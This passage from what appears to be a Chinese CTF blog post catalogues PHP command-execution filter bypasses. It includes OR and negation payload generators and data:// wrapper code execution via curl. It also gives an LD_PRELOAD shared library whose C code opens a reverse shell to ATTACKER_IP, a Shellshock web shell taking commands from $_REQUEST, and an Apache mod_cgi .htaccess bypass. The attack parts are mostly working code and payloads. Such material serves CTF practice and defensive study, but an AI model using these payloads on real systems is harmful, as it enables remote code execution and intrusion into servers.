<h3 id="12-2-或运算绕过"><a href="#12-2-或运算绕过" class="headerlink" title="12.2 或运算绕过"></a>12.2 或运算绕过</h3><p>在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。</p>
<h4 id="构造脚本"><a href="#构造脚本" class="headerlink" title="构造脚本"></a>构造脚本</h4><p>下面给出一个或运算绕过的脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; 256; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=0; <span class="variable">$j</span> &lt;256 ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;16)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;16)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;    // 根据题目给的正则表达式修改即可</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=32&amp;ord(<span class="variable">$c</span>)&lt;=126) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>首先运行以上 PHP 脚本后，会生成一个 txt 文档or_rce.txt，里面包含所有可见字符的或运算构造结果。</p>
<p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">s1=<span class="string">&quot;&quot;</span></span><br><span class="line">s2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=f.readline()</span><br><span class="line"><span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line">s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line">output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>

<p><img src="/./%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/A4eKbwNzhoOlQyxYUyYjhnCqpAd.jpg"></p>
<p>[+] your function：system<br>[+] your command：ls &#x2F;<br>(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%0c%13%00%00”|”%60%60%20%2f”);</p>
<h3 id="12-3-URL-编码取反绕过"><a href="#12-3-URL-编码取反绕过" class="headerlink" title="12.3 URL 编码取反绕过"></a>12.3 URL 编码取反绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// system(&#x27;cat /flag&#x27;)的取反payload</span></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="12-4-自增构造字符"><a href="#12-4-自增构造字符" class="headerlink" title="12.4  自增构造字符"></a>12.4  自增构造字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = [].<span class="string">&#x27;&#x27;</span>; <span class="comment">// 得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>]; <span class="comment">// 得到&quot;A&quot;（$__未定义默认0）</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>; <span class="comment">// $__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>; <span class="comment">// $_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// 得到&quot;D&quot;</span></span><br><span class="line"><span class="comment">// 继续自增可以构造任意字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="13-协议利用绕过"><a href="#13-协议利用绕过" class="headerlink" title="13. 协议利用绕过"></a>13. 协议利用绕过</h2><h3 id="13-1-文件读取协议"><a href="#13-1-文件读取协议" class="headerlink" title="13.1  文件读取协议"></a>13.1  文件读取协议</h3><ul>
<li><p><code>file://</code>：访问本地文件系统</p>
</li>
<li><p><code>php://filter</code>：读取源码并进行过滤</p>
</li>
<li><p><code>php://input</code>：执行POST数据中的PHP代码</p>
</li>
</ul>
<h3 id="13-2-数据输入协议"><a href="#13-2-数据输入协议" class="headerlink" title="13.2 数据输入协议"></a>13.2 数据输入协议</h3><ul>
<li><code>data://</code>：数据流封装器，执行PHP代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用data协议执行PHP代码</span></span><br><span class="line">curl http://example.com/?page=data://text/plain,&lt;?php system(<span class="string">&#x27;ls&#x27;</span>);?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用base64编码</span></span><br><span class="line">curl http://example.com/?page=data://text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCdscycpOz8+</span><br></pre></td></tr></table></figure>



<h3 id="13-3-压缩包协议"><a href="#13-3-压缩包协议" class="headerlink" title="13.3 压缩包协议"></a>13.3 压缩包协议</h3><ul>
<li><p><code>zip://</code>：访问zip压缩包中的文件</p>
</li>
<li><p><code>phar://</code>：访问PHAR归档中的文件</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问zip中的文件</span></span><br><span class="line">zip://archive.zip%23file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问phar中的文件</span></span><br><span class="line">phar://archive.phar/file.txt</span><br></pre></td></tr></table></figure>



<h2 id="14-特殊绕过技术"><a href="#14-特殊绕过技术" class="headerlink" title="14. 特殊绕过技术"></a>14. 特殊绕过技术</h2><h3 id="14-1-LD-PRELOAD绕过"><a href="#14-1-LD-PRELOAD绕过" class="headerlink" title="14.1  LD_PRELOAD绕过"></a>14.1  LD_PRELOAD绕过</h3><p><strong>条件</strong>：</p>
<ol>
<li><p>能够上传自己的.so文件</p>
</li>
<li><p>能够控制环境变量（putenv函数可用）</p>
</li>
</ol>
<ol start="3">
<li>存在启动外部程序的函数（mail()、imap_mail()等）</li>
</ol>
<p><strong>步骤</strong>：</p>
<ol>
<li>编写恶意C代码：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写系统函数</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *__restrict __dest, <span class="type">const</span> <span class="type">char</span> *__restrict __src)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>编译为动态库：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>



<ol start="3">
<li>利用PHP执行：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/path/to/exp.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">// 触发外部程序加载恶意库</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="14-2-Shellshock漏洞（CVE-2014-6271）绕过"><a href="#14-2-Shellshock漏洞（CVE-2014-6271）绕过" class="headerlink" title="14.2 Shellshock漏洞（CVE-2014-6271）绕过"></a>14.2 Shellshock漏洞（CVE-2014-6271）绕过</h3><p><strong>条件</strong>：</p>
<ul>
<li><p>Linux操作系统</p>
</li>
<li><p>PHP版本5.*</p>
</li>
<li><p><code>/bin/bash</code>存在CVE-2014-6271漏洞</p>
</li>
<li><p><code>putenv()</code>、<code>mail()</code>或<code>error_log()</code>函数可用</p>
</li>
</ul>
<p><strong>利用脚本</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="14-3-Apache-Mod-CGI绕过"><a href="#14-3-Apache-Mod-CGI绕过" class="headerlink" title="14.3 Apache Mod CGI绕过"></a>14.3 Apache Mod CGI绕过</h3><p><strong>条件</strong>：</p>
<ul>
<li><p>Linux操作系统</p>
</li>
<li><p>Apache + PHP (apache_mod_php)</p>
</li>
<li><p>Apache开启了cgi, rewrite</p>
</li>
<li><p>Web目录给了AllowOverride权限</p>
</li>
<li><p>当前目录可写</p>
</li>
</ul>
<p><strong>利用方法</strong>：</p>
<ol>
<li>创建.htaccess文件：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xxx</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>创建可执行的CGI脚本（后缀.xxx）：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Content-Type: text/html\n\n&quot;</span></span><br><span class="line"><span class="built_in">id</span>; <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<h3 id="14-4-dev-null-2-1类无回显"><a href="#14-4-dev-null-2-1类无回显" class="headerlink" title="14.4 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显"></a>14.4 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</h3><p>代码中插入了<code>&gt;/dev/null 2&gt;&amp;1</code>，<code>&gt;/dev/null 2&gt;&amp;1</code>的作用就是不回显。利用分隔符<code>||</code>即可绕过，分隔符的含义是前一条命令执行失败了才会执行后一条命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls || &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html">https://websec.readthedocs.io/zh/latest/vuln/cmdinjection.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kalixcn/p/18002501">https://www.cnblogs.com/kalixcn/p/18002501</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq/_42383069/article/details/130221725">https://blog.csdn.net/qq\_42383069/article/details/130221725</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/672515980">https://zhuanlan.zhihu.com/p/672515980</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Thunderclap/_/article/details/129178221">https://blog.csdn.net/Thunderclap\_/article/details/129178221</a></p>
<p><a target="_blank" rel="noopener" href="http://www.huiyao.love/2023/10/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/">http://www.huiyao.love/2023/10/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2022/09/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/">https://pankas.top/2022/09/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/search?search=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%5C&activeType=1%5C&society%5C_id=0%5C&society%5C_name=">https://www.freebuf.com/search?search=%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87\&amp;activeType=1\&amp;society\_id=0\&amp;society\_name=</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq/_43431158/article/details/105422347">https://blog.csdn.net/qq\_43431158/article/details/105422347</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/">https://sebastian-alphax.github.io/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/bypass/">bypass</a></div><div class="post-share"><div class="social-share" data-image="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/22/N1CTF/N1CTF/" title=""><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">WEB || safenotesafenotes.zip 1. 应用架构与漏洞点详解  这是一个笔记应用，允许用户添加、预览笔记  应用运行在 localhost:3000  有一个 admin bot 会访问用户提交的 URL  flag 存储在 cookie 中，仅对 localhost 域名有效  应用实现了严格的 CSP 策略   关键漏洞点： Preview 路由中的 XSS：  /preview 路由使用 innerHTML 渲染内容  应用使用了 escapeHTML() 函数进行过滤，但这可以通过 Unicode 编码绕过   12345678function escapeHTML(str) &#123;    return str        .replace(/&amp;/g, &quot;&amp;amp;&quot;)        .replace(/&lt;/g, &quot;&amp;lt;&quot;)        .replace(/&gt;/g, &quot;&amp;gt;&quot;)        .replace(/&quot;/g...</div></div></div></a><a class="pagination-related" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">PHP反序列化——魔术方法</div></div><div class="info-2"><div class="info-item-1">PHP反序列化——魔术方法转载于：PHP反序列化学习 from Y4er&#x20; 序列化在了解反序列化之前我们首先要知道什么是序列化。 在php中，序列化函数是serialize()。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User&#123;    public $name;    private $sex;    protected $money = 1000;        public function __construct($data, $sex)    &#123;        $this-&gt;data = $data;        $this-&gt;sex = $sex;    &#125;&#125;$number = 66;$str = &#x27;Y4er&#x27;;$bool = true;$null = NULL;$arr = array(&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 2);$user...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/28/JAVA%E5%8F%8D%E5%B0%84/" title="深入理解Java反射机制：动态操作类的强大工具"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/2853232508930053.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-28</div><div class="info-item-2">深入理解Java反射机制：动态操作类的强大工具</div></div><div class="info-2"><div class="info-item-1">深入理解Java反射机制：动态操作类的强大工具什么是反射？Java反射是一种强大的机制，允许程序在运行时动态获取类的信息并对其进行操作。通过反射，我们可以在编译时不需要知道具体类的情况下，运行时获取类的字段、方法、构造函数等信息，并能够动态调用方法、创建实例和访问字段。这种能力使得Java程序具备了更高的灵活性和动态性。 反射的核心类Java反射机制主要由以下几个位于java.lang.reflect包中的核心类组成：  Class类：表示类或接口，是反射操作的入口点 Field类：表示类的字段（成员变量） Method类：表示类的方法 Constructor类：表示类的构造函数  反射实战：通过示例学习让我们通过一个具体的例子来理解反射的各个操作环节： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.lang.reflect.*;public class ReflectionExample &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/09/01/LACTF_2025_arclbroth/" title="LACTF_2025_arclbroth"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image%20(2).png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="info-item-2">LACTF_2025_arclbroth</div></div><div class="info-2"><div class="info-item-1">LACTF_2025_arclbrotharclbroth | CLOSED | working :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145// 导入所需的模块const crypto = require(&#x27;crypto&#x27;);const path = require(&#x27;path&#x27;);const express = require(&#x2...</div></div></div></a><a class="pagination-related" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img class="cover" src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-19</div><div class="info-item-2">LZCTF2025</div></div><div class="info-2"><div class="info-item-1">WEBXX二把嗦 :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)BLACKLIST = [    &#x27;init&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;,&#x27;import&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#...</div></div></div></a><a class="pagination-related" href="/2025/09/12/SUCTF/" title="SUCTF"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-12</div><div class="info-item-2">SUCTF</div></div><div class="info-2"><div class="info-item-1">SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析攻击链概览1234567891011RejectedPromise::__destruct()     ↓Response::__toString()     ↓Table::__call()     ↓BehaviorRegistry::call()     ↓MockClass::generate()     ↓eval() - RCE    详细分析每个环节1. 入口点 - 反序列化触发位置: src/PagesController.php:79 123456public function handleSer()&#123;    $ser = $this-&gt;request-&gt;getQuery(&#x27;ser&#x27;);    unserialize(base64_decode($ser));  // 直接反序列化用户输入    // ...&#125;    攻击方式: GET /ser?ser=&lt;base64_encoded_payload&gt; 关键点:  没有任何输入验证  直...</div></div></div></a><a class="pagination-related" href="/2025/07/15/hello-world/" 